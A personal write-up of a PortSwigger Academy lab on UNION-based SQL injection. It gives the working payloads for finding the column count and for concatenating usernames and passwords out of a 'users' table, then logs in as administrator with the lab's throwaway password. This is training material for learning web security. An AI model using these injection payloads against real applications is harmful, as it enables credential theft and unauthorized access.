
# #PortSwigger 


![[Pasted image 20251212224811.png]]


## Lab Description

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

**Objective:** Retrieve all usernames and passwords from the `users` table and use the information to log in as the `administrator` user.

**Hint:** Only one column contains text data, so you need to concatenate multiple values into a single column.

---
---

### Step 1: Capture the Category Filter Request

1. In Burp's browser, access the lab
2. Click on a product category filter (e.g., "Gifts")
3. In Burp Proxy, find the request

**Example request:**
```
GET /filter?category=Gifts HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```


---

### Step 2: Determine Number of Columns

**Test with `UNION SELECT NULL, 'abc'`:**
```
'+UNION+SELECT+NULL,'abc'--
```

**Response:**
![[Pasted image 20251212224943.png]]

2 columns, only 1 column contains text data.

---

### Step 3: Concatenate Username and Password

**Payload (PostgreSQL/MySQL/SQL Server):**
```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

**Response:**
![[Pasted image 20251212225013.png]]


---

### Step 4: Extract Administrator Credentials

|Concatenated String|Username|Password|
|---|---|---|
|`administrator~j4dd3pkl0lhgjf8167sa`|`administrator`|`j4dd3pkl0lhgjf8167sa`|

---

### Step 5: Log In as Administrator

1. Go to the login page
2. Username: `administrator`
3. Password: `j4dd3pkl0lhgjf8167sa`
4. Click **Log in**


![[Pasted image 20251212225106.png]]


---

### Step 6: Lab Solved

![[Pasted image 20251212225120.png]]


---
---
